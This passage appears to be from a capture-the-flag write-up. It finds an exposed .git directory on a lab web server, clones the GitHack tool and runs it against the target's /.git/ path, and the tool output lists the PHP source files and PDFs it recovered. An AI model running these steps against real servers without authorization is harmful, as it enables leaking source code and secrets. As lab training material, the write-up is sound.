On the enumerate section there's a <font color="#ffc000">|_  /.git/HEAD: Git</font>  folder. Accessing the directory gives the 403 status.

Hidden directories, left accidentally (or not) on the server, might be a very valuable source of sensitive data leaks. More info https://github.com/bl4de/research/tree/master/hidden_directories_leaks#hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application.


## Install the exploit.
`$ git clone https://github.com/lijiejie/GitHack.git` 

Run the exploit.
`$ python3 GitHack.py http://10.10.25.126/.git/` 

[+] Download and parse index file ...
[+] CTX_WSUSpect_White_Paper.pdf
[+] Context_Red_Teaming_Guide.pdf
[+] Context_White_Paper_Pen_Test_101.pdf
[+] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
[+] Glibc_Adventures-The_Forgotten_Chunks.pdf
[+] api.php
[[APK flag]]
[[GIT flag]]
[[WEBAPP flag]]
[+] functions.php
[+] home.php
[+] index.php
[+] info.php
[OK] home.php
[OK] functions.php
[OK] info.php
[OK] api.php
[OK] index.php
[OK] Context_White_Paper_Pen_Test_101.pdf
[OK] Context_Red_Teaming_Guide.pdf
[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
[OK] CTX_WSUSpect_White_Paper.pdf
[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf

[[Web flag]]
